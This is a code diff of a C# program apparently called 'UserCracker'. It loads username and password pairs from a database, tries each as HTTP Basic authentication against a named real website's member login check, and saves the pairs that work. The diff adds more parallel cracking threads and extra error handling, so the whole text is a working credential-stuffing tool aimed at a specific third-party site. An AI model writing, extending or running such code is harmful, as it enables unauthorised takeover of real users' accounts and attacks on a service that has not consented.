@@ -14,7 +14,7 @@ namespace SweetFly.UserCracker
     internal class Program
     {
         private static readonly IUserCrackRepository repository = new MongoDbRepository();
-        private static int skip = 134451;
+        private static int skip = 1487460;
 
         private static void Main(string[] args)
         {
@@ -22,7 +22,7 @@ namespace SweetFly.UserCracker
             Process();
             //Crack();
 
-            Console.ReadKey();
+            Console.ReadLine();
         }
 
         private async static void Process()
@@ -32,45 +32,56 @@ namespace SweetFly.UserCracker
             Task.Factory.StartNew(new Func<Task>(Crack));
             Task.Factory.StartNew(new Func<Task>(Crack));
             Task.Factory.StartNew(new Func<Task>(Crack));
+            Task.Factory.StartNew(new Func<Task>(Crack));
+            Task.Factory.StartNew(new Func<Task>(Crack));
+            Task.Factory.StartNew(new Func<Task>(Crack));
+            Task.Factory.StartNew(new Func<Task>(Crack));
         }
 
         private async static Task Crack()
         {
-            const string url = "http://learning.cmr.com.cn/member/checkuser.asp?type=AD";
-            while (true)
+            try
             {
-                var skipNo = Interlocked.Increment(ref skip);
-                repository.SavePosition(skipNo);
-                var crackUser = await repository.GetOne(skipNo);
-
-                try
+                const string url = "http://learning.cmr.com.cn/member/checkuser.asp?type=AD";
+                while (true)
                 {
-                    var baseAuth = string.Format("Basic {0}",
-                        Base64Encrypt.EncryptString(crackUser.UserName + ":" + crackUser.Password));
+                    var skipNo = Interlocked.Increment(ref skip);
+                    repository.SavePosition(skipNo);
+                    var crackUser = await repository.GetOne(skipNo);
 
-                    var strResponse = HttpUtility.Get(url, Encoding.UTF8, x =>
+                    try
                     {
-                        x.Referer = "http://learning.cmr.com.cn/";
-                        x.Headers["Authorization"] = baseAuth;
-                    });
+                        var baseAuth = string.Format("Basic {0}",
+                            Base64Encrypt.EncryptString(crackUser.UserName + ":" + crackUser.Password));
 
-                    //保存
-                    repository.SaveSuccessUserInfo(new CmrUserInfo()
+                        var strResponse = HttpUtility.Get(url, Encoding.UTF8, x =>
+                        {
+                            x.Referer = "http://learning.cmr.com.cn/";
+                            x.Headers["Authorization"] = baseAuth;
+                        });
+
+                        //保存
+                        repository.SaveSuccessUserInfo(new CmrUserInfo()
+                        {
+                            UserName = crackUser.UserName,
+                            Password = crackUser.Password,
+                            CreateDate = DateTime.Now
+                        });
+                        Console.WriteLine(JsonUtility.Serialize(crackUser));
+                    }
+                    catch (WebException)
                     {
-                        UserName = crackUser.UserName,
-                        Password = crackUser.Password,
-                        CreateDate = DateTime.Now
-                    });
-                    Console.WriteLine(JsonUtility.Serialize(crackUser));
+                        Console.Write(".");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Message);
+                    }
                 }
-                catch (WebException)
-                {
-                    Console.Write(".");
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
             }
         }
     }
